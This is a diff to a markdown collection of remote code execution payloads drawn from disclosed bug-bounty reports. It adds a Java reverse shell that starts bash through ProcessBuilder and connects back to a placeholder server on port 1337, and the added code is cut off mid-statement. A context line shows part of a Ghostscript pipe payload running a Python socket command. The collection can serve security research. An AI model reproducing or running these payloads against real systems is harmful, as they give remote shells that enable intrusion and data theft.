@@ -1,6 +1,6 @@
 # Remote Code Execution
 
-72 payloads from disclosed reports.
+73 payloads from disclosed reports.
 
 ## Buffer overflow via oversized PROXY protocol v1 header
 
@@ -617,6 +617,20 @@ mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(s
 ```
 
 — [H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products](https://hackerone.com/reports/422944) · Shopify · [fransrosen](https://hackerone.com/fransrosen)
+
+
+## Java reverse shell using ProcessBuilder to connect back to attacker
+
+### `39c09d95`
+
+```
+String host="your_server_ip";
+int port=1337;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exi
+```
+
+— [ Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/](https://hackerone.com/reports/2083771) · U.S. Dept Of Defense · [shuvam321](https://hackerone.com/shuvam321)
 
 
 ## Local file inclusion via directory traversal in account_name parameter
